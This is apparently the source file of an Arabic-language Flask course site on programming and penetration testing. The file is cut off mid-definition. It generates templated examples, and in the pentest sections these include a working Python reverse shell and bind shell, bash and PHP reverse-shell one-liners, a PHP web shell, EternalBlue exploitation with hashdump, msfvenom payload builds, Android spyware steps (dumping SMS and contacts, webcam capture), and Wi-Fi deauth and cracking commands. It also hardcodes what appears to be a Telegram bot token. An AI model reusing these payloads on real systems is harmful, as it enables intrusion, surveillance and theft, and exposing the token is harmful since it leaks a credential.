from flask import Flask, render_template_string, request, jsonify
import os
import json
import requests
import threading
import datetime

app = Flask(__name__)

# ===== إعدادات بوت تيليجرام =====
TELEGRAM_TOKEN = "8875360747:AAHZH8ti8BTzA8_Gzo6QV6ex4OsaJyoBovI"
TELEGRAM_CHAT_ID = "8875360747"

def send_telegram_notification(message):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload, timeout=5)
        return response.json()
    except Exception as e:
        print(f"خطأ في إرسال الإشعار: {e}")
        return None

# ===== بيانات الدورس التعليمية =====
COURSES_DATA = {}

# ===== دالة لتوليد 100 كود تعليمي لكل درس =====
def generate_100_codes(course_id, base_code):
    codes = []
    
    lang = 'python'
    if 'cpp' in course_id:
        lang = 'cpp'
    elif 'js' in course_id:
        lang = 'javascript'
    elif 'assembly' in course_id:
        lang = 'assembly'
    elif 'bash' in course_id:
        lang = 'bash'
    elif 'sqlmap' in course_id or 'exploit' in course_id or 'sql' in course_id:
        lang = 'sql'
    elif 'nmap' in course_id or 'scanning' in course_id:
        lang = 'nmap'
    elif 'metasploit' in course_id:
        lang = 'metasploit'
    elif 'burp' in course_id:
        lang = 'burp'
    elif 'wireshark' in course_id or 'network' in course_id:
        lang = 'wireshark'
    elif 'payload' in course_id:
        lang = 'payload'
    elif 'recon' in course_id:
        lang = 'recon'
    elif 'crypto' in course_id:
        lang = 'crypto'
    elif 'wifi' in course_id:
        lang = 'wifi'
    elif 'mobile' in course_id:
        lang = 'mobile'
    
    for i in range(1, 101):
        if lang == 'python':
            codes.append(f'''# ===== المثال رقم {i} =====
# درس: {course_id}

def example_{i}():
    print(f"تنفيذ المثال رقم {i}")
    x = {i}
    y = {i * 2}
    z = x + y
    my_list = [1, 2, 3, 4, 5, {i}]
    my_dict = {{'id': {i}, 'name': f'item_{i}', 'value': {i * 10}}}
    for num in range({i % 5 + 1}):
        print(f"  الرقم: {{num}}")
    def calculate(a, b):
        return a * b + {i}
    result = calculate({i}, {i+1})
    if result > 100:
        print(f"النتيجة كبيرة: {{result}}")
    else:
        print(f"النتيجة صغيرة: {{result}}")
    try:
        value = {i} / max(1, {i % 3})
    except ZeroDivisionError:
        print("لا يمكن القسمة على صفر")
    return result

if __name__ == "__main__":
    output = example_{i}()
    print(f"المخرجات: {{output}}")
''')
        
        elif lang == 'cpp':
            codes.append(f'''// ===== المثال رقم {i} =====
// درس: {course_id}

#include <iostream>
#include <vector>
#include <map>
#include <string>
using namespace std;

int example_{i}() {{
    cout << "تنفيذ المثال رقم {i}" << endl;
    int x = {i};
    double y = {i * 2.5};
    string name = "item_" + to_string({i});
    vector<int> numbers;
    for(int j = 0; j < {i % 10 + 1}; j++) {{
        numbers.push_back(j * {i});
    }}
    map<string, int> data;
    data["id"] = {i};
    data["value"] = {i * 10};
    for(int num : numbers) {{
        cout << "  رقم: " << num << endl;
    }}
    if(x > 50) {{
        cout << "الرقم أكبر من 50" << endl;
    }} else {{
        cout << "الرقم أقل أو يساوي 50" << endl;
    }}
    auto calculate = [&](int a, int b) {{
        return a * b + {i};
    }};
    int result = calculate({i}, {i+1});
    cout << "النتيجة: " << result << endl;
    return result;
}}

int main() {{
    example_{i}();
    return 0;
}}
''')
        
        elif lang == 'javascript':
            codes.append(f'''// ===== المثال رقم {i} =====
// درس: {course_id}

function example_{i}() {{
    console.log(`تنفيذ المثال رقم {i}`);
    let x = {i};
    const y = {i * 2};
    var name = `item_${{i}}`;
    const numbers = Array.from({{length: {i % 10 + 1}}}, (_, idx) => idx * {i});
    const data = {{
        id: {i},
        name: `item_${{i}}`,
        value: {i * 10}
    }};
    numbers.forEach(num => {{
        console.log(`  رقم: ${{num}}`);
    }});
    const calculate = (a, b) => {{
        return a * b + {i};
    }};
    const result = calculate({i}, {i+1});
    if (result > 100) {{
        console.log(`النتيجة كبيرة: ${{result}}`);
    }} else {{
        console.log(`النتيجة صغيرة: ${{result}}`);
    }}
    const promise = new Promise((resolve) => {{
        setTimeout(() => resolve(`تم تنفيذ {i}`), 1000);
    }});
    promise.then(msg => console.log(msg));
    return result;
}}

example_{i}();
''')
        
        elif lang == 'bash':
            codes.append(f'''#!/bin/bash
# ===== المثال رقم {i} =====
# درس: {course_id}

echo "تنفيذ المثال رقم {i}"
x={i}
y=$(({i} * 2))
name="item_${{i}}"
numbers=()
for ((j=0; j<{i % 10 + 1}; j++)); do
    numbers+=($((j * {i})))
done
for num in "${{numbers[@]}}"; do
    echo "  رقم: $num"
done
if [ $x -gt 50 ]; then
    echo "الرقم أكبر من 50"
else
    echo "الرقم أقل أو يساوي 50"
fi
calculate() {{
    local a=$1
    local b=$2
    echo $((a * b + {i}))
}}
result=$(calculate {i} $(({i}+1)))
echo "النتيجة: $result"
echo "محتوى الملف" > output_{i}.txt
echo "تم إنشاء output_{i}.txt"
''')
        
        elif lang == 'assembly':
            codes.append(f'''; ===== المثال رقم {i} =====
; درس: {course_id}

section .data
    msg_{i} db 'تنفيذ المثال رقم {i}', 0
    newline db 10, 0
    num_{i} dw {i}
    num2_{i} dw {i * 2}
    result_{i} dw 0

section .bss
    buffer_{i} resb 100

section .text
    global _start

_start:
    mov eax, 4
    mov ebx, 1
    mov ecx, msg_{i}
    mov edx, 30
    int 0x80
    mov ax, [num_{i}]
    add ax, [num2_{i}]
    mov [result_{i}], ax
    mov eax, [result_{i}]
    add eax, 48
    mov [buffer_{i}], eax
    mov eax, 4
    mov ebx, 1
    mov ecx, buffer_{i}
    mov edx, 1
    int 0x80
    mov eax, 1
    xor ebx, ebx
    int 0x80
''')
        
        elif lang in ['sql', 'sqlmap']:
            codes.append(f'''-- ===== المثال رقم {i} =====
-- درس: {course_id}

CREATE TABLE IF NOT EXISTS users_{i} (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password TEXT NOT NULL,
    email TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    status INTEGER DEFAULT 1
);

INSERT INTO users_{i} (username, password, email)
VALUES 
    ('admin_{i}', 'pass123_{i}', 'admin_{i}@example.com'),
    ('user1_{i}', 'userpass_{i}', 'user1_{i}@example.com'),
    ('test_{i}', 'testpass_{i}', 'test_{i}@example.com');

SELECT * FROM users_{i} WHERE id = {i % 5 + 1};
SELECT username, email FROM users_{i} WHERE status = 1;
SELECT * FROM users_{i} ORDER BY created_at DESC;
UPDATE users_{i} SET status = 0 WHERE id = {i % 3 + 1};
DELETE FROM users_{i} WHERE id = {i % 2 + 1};
SELECT COUNT(*) as total_users FROM users_{i};
SELECT status, COUNT(*) as count FROM users_{i} GROUP BY status;
''')
        
        elif lang == 'nmap':
            codes.append(f'''# ===== المثال رقم {i} =====
# درس: {course_id}

nmap -T4 -F 192.168.1.0/24
nmap -p- 192.168.1.100
nmap -sV --version-intensity {i % 9 + 1} 192.168.1.100
nmap -O 192.168.1.100
nmap -sU 192.168.1.100
nmap --script vuln 192.168.1.100
nmap --script http-enum 192.168.1.100
nmap --script smb-enum-shares 192.168.1.100
nmap -f -D RND:10 192.168.1.100
nmap -sP 192.168.1.0/24
nmap -p 80,443,8080,{i} 192.168.1.100
nmap -oX scan_{i}.xml 192.168.1.100
''')
        
        elif lang == 'metasploit':
            codes.append(f'''# ===== المثال رقم {i} =====
# درس: {course_id}

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.0/24
run
use post/windows/gather/hashdump
set SESSION {i % 5 + 1}
run
sessions -l
sessions -i {i % 5 + 1}
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload_{i}.exe
''')
        
        elif lang == 'burp':
            codes.append(f'''# ===== المثال رقم {i} =====
# درس: {course_id}

# المتصفح -> Burp (127.0.0.1:8080)
# Proxy -> Intercept -> تشغيل
# إرسال طلب إلى Repeater
# تعديل المعاملات وإعادة الإرسال
# استخدام Intruder مع قائمة كلمات
# استغلال SQL Injection: ' OR '1'='1
# استغلال XSS: <script>alert('XSS_{i}')</script>
# Scanner -> إضافة هدف -> بدء المسح التلقائي
# تثبيت Extensions من BApp Store
''')
        
        elif lang == 'wireshark':
            codes.append(f'''# ===== المثال رقم {i} =====
# درس: {course_id}

wireshark
# اختيار واجهة والضغط على Start
# تصفية: http
# تصفية: tcp.port == 443
# تصفية: dns
# تصفية: ip.addr == 192.168.1.100
# تصفية: tcp.port == 80
# Follow -> TCP Stream
# File -> Export Objects -> HTTP
tcpdump -i eth0 -w capture_{i}.pcap
wireshark capture_{i}.pcap
# Statistics -> Protocol Hierarchy
# Statistics -> Endpoints
''')
        
        elif lang == 'payload':
            codes.append(f'''# ===== المثال رقم {i} =====
# درس: {course_id}

# Reverse Shell Python
import socket, subprocess, os
def reverse_shell_{i}():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.1.50', 4444))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(['/bin/sh', '-i'])
    except:
        pass

# Reverse Shell Bash: bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
# Reverse Shell PHP: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'"); ?>
# Web Shell: <?php system($_GET['cmd_{i}']); ?>
# Bind Shell Python
import socket, subprocess
def bind_shell_{i}():
    s = socket.socket()
    s.bind(('0.0.0.0', 4444))
    s.listen(5)
    while True:
        client, addr = s.accept()
        while True:
            cmd = client.recv(1024).decode()
            output = subprocess.getoutput(cmd)
            client.send(output.encode())
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload_{i}.exe
# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload_{i}.apk
# msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload_{i}.elf
''')
        
        elif lang == 'recon':
            codes.append(f'''# ===== المثال رقم {i} =====
# درس: {course_id}

whois example.com
nslookup example.com
dig example.com
import socket, requests, whois
def recon_{i}(domain):
    print(f"[+] جمع المعلومات عن: {{domain}}")
    try:
        w = whois.whois(domain)
        print(f"  Registrar: {{w.registrar}}")
        print(f"  Creation Date: {{w.creation_date}}")
        print(f"  Expiration Date: {{w.expiration_date}}")
    except: pass
    try:
        ip = socket.gethostbyname(domain)
        print(f"  IP Address: {{ip}}")
    except: pass
    try:
        headers = requests.head(f"http://{{domain}}").headers
        print(f"  Server: {{headers.get('Server', 'Unknown')}}")
    except: pass
    subdomains = ['www', 'mail', 'ftp', 'admin', 'test', 'dev', 'api']
    for sub in subdomains:
        try:
            subdomain = f"{{sub}}.{{domain}}"
            socket.gethostbyname(subdomain)
            print(f"  Found: {{subdomain}}")
        except: pass
    return f"Recon {i} completed"
recon_{i}("example.com")
# Google Dorks: site:example.com filetype:pdf
# Shodan: shodan search 'apache' --limit 10
# theHarvester: theHarvester -d example.com -b google -l 100
''')
        
        elif lang == 'crypto':
            codes.append(f'''# ===== المثال رقم {i} =====
# درس: {course_id}

import hashlib, base64
from cryptography.fernet import Fernet
def crypto_{i}():
    print(f"[+] مثال التشفير رقم {i}")
    text = f"message_{i}"
    encoded = base64.b64encode(text.encode()).decode()
    decoded = base64.b64decode(encoded).decode()
    print(f"  Base64: {{encoded}}")
    print(f"  فك: {{decoded}}")
    hash_obj = hashlib.sha256(text.encode())
    hash_hex = hash_obj.hexdigest()
    print(f"  SHA-256: {{hash_hex[:32]}}...")
    md5_obj = hashlib.md5(text.encode())
    print(f"  MD5: {{md5_obj.hexdigest()}}")
    key = Fernet.generate_key()
    cipher = Fernet(key)
    encrypted = cipher.encrypt(text.encode())
    decrypted = cipher.decrypt(encrypted).decode()
    print(f"  مشفر (Fernet): {{encrypted[:50]}}...")
    print(f"  مفكوك (Fernet): {{decrypted}}")
    return "تم التشفير بنجاح"
crypto_{i}()
# openssl enc -aes-256-cbc -salt -in file.txt -out file.enc
# openssl enc -d -aes-256-cbc -in file.enc -out file.txt
# openssl genrsa -out private.key 2048
# hashcat -m 0 -a 0 hash.txt rockyou.txt
''')
        
        elif lang == 'wifi':
            codes.append(f'''# ===== المثال رقم {i} =====
# درس: {course_id}

sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng -c CHANNEL --bssid MAC wlan0mon
sudo airodump-ng -c CHANNEL --bssid MAC -w capture_{i} wlan0mon
sudo aireplay-ng -0 5 -a MAC wlan0mon
sudo aircrack-ng -w wordlist.txt capture_{i}.cap
hcxpcapngtool -o hash_{i}.22000 capture_{i}.cap
hashcat -m 22000 hash_{i}.22000 rockyou.txt
sudo hcxdumptool -i wlan0mon -o dump_{i}.pcapng --enable_status=1
sudo hcxpcaptool -z hash_{i}.16800 dump_{i}.pcapng
hashcat -m 16800 hash_{i}.16800 rockyou.txt
sudo wash -i wlan0mon
sudo reaver -i wlan0mon -b MAC -c CHANNEL -vv
sudo airbase-ng -a MAC -e "FreeWiFi" wlan0mon
sudo dhcpd -cf /etc/dhcp/dhcpd.conf wlan0
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:8080
''')
        
        elif lang == 'mobile':
            codes.append(f'''# ===== المثال رقم {i} =====
# درس: {course_id}

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o payload_{i}.apk
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore payload_{i}.apk alias_name
zipalign -v 4 payload_{i}.apk payload_{i}_signed.apk
# msfconsole
# use exploit/multi/handler
# set PAYLOAD android/meterpreter/reverse_tcp
# set LHOST 192.168.1.50
# set LPORT 4444
# exploit
# meterpreter > sysinfo
# meterpreter > webcam_snap
# meterpreter > dump_contacts
# meterpreter > dump_sms
# meterpreter > geolocate
adb devices
adb shell
adb install payload_{i}.apk
# /data/data/com.example/databases/
# /data/data/com.example/shared_prefs/
# /sdcard/Android/data/
''')
        
        else:
            codes.append(f'''# ===== المثال رقم {i} =====
# درس: {course_id}

print(f"المثال رقم {i}")
x = {i}
y = {i * 2}
z = x + y
print(f"x = {{x}}, y = {{y}}, z = {{z}}")
numbers = [n * {i} for n in range(10)]
print(f"الأرقام: {{numbers[:5]}}...")
data = {{
    'id': {i},
    'name': f'item_{i}',
    'value': {i * 10}
}}
print(f"البيانات: {{data}}")
for n in range({i % 5 + 1}):
    print(f"  n = {{n}}")
def example_func(x):
    return x * 2 + {i}
result = example_func({i})
print(f"النتيجة: {{result}}")
''')
    
    return codes

# ===== 1. البرمجة (30 درس) =====
programming_courses = [
    {"id": "python1", "name": "Python - أساسيات اللغة", "level": "مبتدئ", "duration": "3 ساعات", "category": "البرمجة"},
    {"id": "python2", "name": "Python - المتغيرات والأنواع", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة"},
    {"id": "python3", "name": "Python - الحلقات والتكرار", "level": "مبتدئ", "duration": "2.5 ساعات", "category": "البرمجة"},
    {"id": "python4", "name": "Python - الدوال والبرمجة الوظيفية", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة"},
    {"id": "python5", "name": "Python - البرمجة الكائنية OOP", "level": "متوسط", "duration": "4 ساعات", "category": "البرمجة"},
    {"id": "python6", "name": "Python - المصفوفات والقوائم", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة"},
    {"id": "python7", "name": "Python - القواميس والمجموعات", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة"},
    {"id": "python8", "name": "Python - التعامل مع الملفات", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة"},
    {"id": "python9", "name": "Python - المكتبات الشائعة", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة"},
    {"id": "python10", "name": "Python - التعامل مع قواعد البيانات", "level": "متقدم", "duration": "4 ساعات", "category": "البرمجة"},
    {"id": "cpp1", "name": "C++ - أساسيات اللغة", "level": "مبتدئ", "duration": "3 ساعات", "category": "البرمجة"},
    {"id": "cpp2", "name": "C++ - المتغيرات والعمليات", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة"},
    {"id": "cpp3", "name": "C++ - الحلقات والشرط", "level": "مبتدئ", "duration": "2.5 ساعات", "category": "البرمجة"},
    {"id": "cpp4", "name": "C++ - الدوال والبرمجة", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة"},
    {"id": "cpp5", "name": "C++ - البرمجة الكائنية", "level": "متوسط", "duration": "4 ساعات", "category": "البرمجة"},
    {"id": "cpp6", "name": "C++ - المؤشرات والذاكرة", "level": "متقدم", "duration": "4 ساعات", "category": "البرمجة"},
    {"id": "cpp7", "name": "C++ - التعامل مع الملفات", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة"},
    {"id": "cpp8", "name": "C++ - STL والحاويات", "level": "متقدم", "duration": "4 ساعات", "category": "البرمجة"},
    {"id": "js1", "name": "JavaScript - أساسيات", "level": "مبتدئ", "duration": "3 ساعات", "category": "البرمجة"},
    {"id": "js2", "name": "JavaScript - الدوال والسهمية", "level": "متوسط", "duration": "2 ساعات", "category": "البرمجة"},
    {"id": "js3", "name": "JavaScript - DOM والتعامل مع الصفحة", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة"},
    {"id": "js4", "name": "JavaScript - Ajax و Fetch", "level": "متوسط", "duration": "3 ساعات", "category": "البرمجة"},
    {"id": "js5", "name": "JavaScript - Promises و Async", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة"},
    {"id": "js6", "name": "JavaScript - OOP في JavaScript", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة"},
    {"id": "assembly1", "name": "Assembly - مقدمة", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة"},
    {"id": "assembly2", "name": "Assembly - العمليات الحسابية", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة"},
    {"id": "bash1", "name": "Bash - أساسيات", "level": "مبتدئ", "duration": "2 ساعات", "category": "البرمجة"},
    {"id": "bash2", "name": "Bash - الحلقات والشروط", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة"},
    {"id": "bash3", "name": "Bash - إدارة الملفات والأنظمة", "level": "متوسط", "duration": "2.5 ساعات", "category": "البرمجة"},
    {"id": "bash4", "name": "Bash - الأتمتة والـ Cron Jobs", "level": "متقدم", "duration": "3 ساعات", "category": "البرمجة"},
]

# ===== 2. اختبار الاختراق (40 درس) =====
pentest_courses = [
    {"id": "recon1", "name": "جمع المعلومات - أساسيات", "level": "مبتدئ", "duration": "2 ساعات", "category": "اختبار الاختراق"},
    {"id": "recon2", "name": "جمع المعلومات - Google Dorks", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق"},
    {"id": "recon3", "name": "جمع المعلومات - Shodan", "level": "متوسط", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
    {"id": "recon4", "name": "جمع المعلومات - الأفراد", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق"},
    {"id": "scanning1", "name": "مسح الشبكات - Nmap أساسي", "level": "مبتدئ", "duration": "2 ساعات", "category": "اختبار الاختراق"},
    {"id": "scanning2", "name": "مسح الشبكات - Nmap متقدم", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "scanning3", "name": "مسح الشبكات - Masscan", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق"},
    {"id": "scanning4", "name": "مسح الشبكات - اكتشاف الخدمات", "level": "متوسط", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
    {"id": "exploit1", "name": "SQL Injection - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "exploit2", "name": "SQL Injection - متقدم", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق"},
    {"id": "exploit3", "name": "XSS - هجمات عبر المواقع", "level": "متوسط", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
    {"id": "exploit4", "name": "XSS - متقدم والاستغلال", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "exploit5", "name": "CSRF - هجمات", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق"},
    {"id": "exploit6", "name": "File Inclusion - LFI/RFI", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "exploit7", "name": "Command Injection", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
    {"id": "exploit8", "name": "Buffer Overflow - أساسيات", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق"},
    {"id": "exploit9", "name": "Buffer Overflow - استغلال", "level": "خبير", "duration": "5 ساعات", "category": "اختبار الاختراق"},
    {"id": "exploit10", "name": "الهندسة الاجتماعية", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق"},
    {"id": "post1", "name": "ما بعد الاختراق - رفع الصلاحيات", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "post2", "name": "ما بعد الاختراق - التخفي", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "post3", "name": "ما بعد الاختراق - جمع المعلومات", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
    {"id": "post4", "name": "ما بعد الاختراق - الحفاظ على الوصول", "level": "خبير", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "post5", "name": "ما بعد الاختراق - التنقل الداخلي", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
    {"id": "post6", "name": "ما بعد الاختراق - البيانات الحساسة", "level": "متقدم", "duration": "2 ساعات", "category": "اختبار الاختراق"},
    {"id": "post7", "name": "ما بعد الاختراق - حرق الآثار", "level": "متقدم", "duration": "2 ساعات", "category": "اختبار الاختراق"},
    {"id": "wifi1", "name": "اختراق Wi-Fi - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "wifi2", "name": "اختراق Wi-Fi - WPA/WPA2", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق"},
    {"id": "wifi3", "name": "اختراق Wi-Fi - هجمات متقدمة", "level": "خبير", "duration": "4 ساعات", "category": "اختبار الاختراق"},
    {"id": "mobile1", "name": "اختراق Android - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "mobile2", "name": "اختراق Android - متقدم", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق"},
    {"id": "web1", "name": "اختراق الويب - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "web2", "name": "اختراق الويب - الاستغلال", "level": "متقدم", "duration": "4 ساعات", "category": "اختبار الاختراق"},
    {"id": "web3", "name": "اختراق الويب - أتمتة", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "network1", "name": "اختراق الشبكات - MITM", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "network2", "name": "اختراق الشبكات - DNS Spoofing", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
    {"id": "network3", "name": "اختراق الشبكات - Packet Sniffing", "level": "متوسط", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "crypto1", "name": "التشفير - أساسيات", "level": "متوسط", "duration": "2 ساعات", "category": "اختبار الاختراق"},
    {"id": "crypto2", "name": "كسر التشفير - هجمات", "level": "متقدم", "duration": "3 ساعات", "category": "اختبار الاختراق"},
    {"id": "crypto3", "name": "التشفير - المفاتيح والشهادات", "level": "متقدم", "duration": "2.5 ساعات", "category": "اختبار الاختراق"},
]

# ===== 3. الأدوات (44 درس) =====
tools_courses = [
    {"id": "metasploit1", "name": "Metasploit - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "metasploit2", "name": "Metasploit - حمولات", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "metasploit3", "name": "Metasploit - متقدم", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات"},
    {"id": "metasploit4", "name": "Metasploit - الأتمتة", "level": "خبير", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "nmap1", "name": "Nmap - أساسيات", "level": "مبتدئ", "duration": "2 ساعات", "category": "الأدوات"},
    {"id": "nmap2", "name": "Nmap - متقدم", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "nmap3", "name": "Nmap - NSE Scripts", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "burp1", "name": "Burp Suite - أساسيات", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "burp2", "name": "Burp Suite - هجمات", "level": "متقدم", "duration": "4 ساعات", "category": "الأدوات"},
    {"id": "burp3", "name": "Burp Suite - المتقدم", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات"},
    {"id": "wireshark1", "name": "Wireshark - أساسيات", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات"},
    {"id": "wireshark2", "name": "Wireshark - تحليل متقدم", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "wireshark3", "name": "Wireshark - اكتشاف الهجمات", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "payload1", "name": "الحمولات - Reverse Shell", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "payload2", "name": "الحمولات - Web Shell", "level": "متقدم", "duration": "2.5 ساعات", "category": "الأدوات"},
    {"id": "payload3", "name": "الحمولات - Bind Shell", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "payload4", "name": "الحمولات - مخصصة", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات"},
    {"id": "payload5", "name": "الحمولات - في C", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات"},
    {"id": "hydra1", "name": "Hydra - كسر كلمات المرور", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
    {"id": "john1", "name": "John the Ripper", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
    {"id": "aircrack1", "name": "Aircrack-ng - Wi-Fi", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "sqlmap1", "name": "SQLmap - أساسيات", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات"},
    {"id": "sqlmap2", "name": "SQLmap - متقدم", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "beef1", "name": "BeEF - استغلال المتصفح", "level": "متقدم", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "social1", "name": "Social-Engineer Toolkit", "level": "متوسط", "duration": "3 ساعات", "category": "الأدوات"},
    {"id": "maltego1", "name": "Maltego - OSINT", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات"},
    {"id": "reconng1", "name": "Recon-ng - OSINT", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
    {"id": "theharvester1", "name": "theHarvester - جمع البريد", "level": "مبتدئ", "duration": "1.5 ساعات", "category": "الأدوات"},
    {"id": "sherlock1", "name": "Sherlock - أفراد", "level": "مبتدئ", "duration": "1.5 ساعات", "category": "الأدوات"},
    {"id": "gobuster1", "name": "Gobuster - مسح الدلائل", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
    {"id": "ffuf1", "name": "FFUF - مسح سريع", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
    {"id": "nikto1", "name": "Nikto - مسح الثغرات", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
    {"id": "wpscan1", "name": "WPScan - WordPress", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات"},
    {"id": "droopescan1", "name": "Droopescan - Drupal", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
    {"id": "joomscan1", "name": "Joomscan - Joomla", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
    {"id": "nuclei1", "name": "Nuclei - ثغرات", "level": "متقدم", "duration": "2.5 ساعات", "category": "الأدوات"},
    {"id": "katana1", "name": "Katana - الزحف", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
    {"id": "wayback1", "name": "Wayback Machine - الأرشيف", "level": "مبتدئ", "duration": "1.5 ساعات", "category": "الأدوات"},
    {"id": "shodan1", "name": "Shodan - متقدم", "level": "متوسط", "duration": "2.5 ساعات", "category": "الأدوات"},
    {"id": "censys1", "name": "Censys - المسح", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
    {"id": "zoomeye1", "name": "ZoomEye - المسح", "level": "متوسط", "duration": "2 ساعات", "category": "الأدوات"},
    {"id": "binary1", "name": "Binary Analysis - التحليل", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات"},
    {"id": "debugger1", "name": "Debugging - التصحيح", "level": "خبير", "duration": "4 ساعات", "category": "الأدوات"},
]

# ===== دمج جميع الدورس =====
for course in programming_courses + pentest_courses + tools_courses:
    codes = generate_100_codes(course["id"], "")
    COURSES_DATA[course["id"]] = {
        "name": course["name"],
        "level": course["level"],
        "duration": course["duration"],
        "category": course["category"],
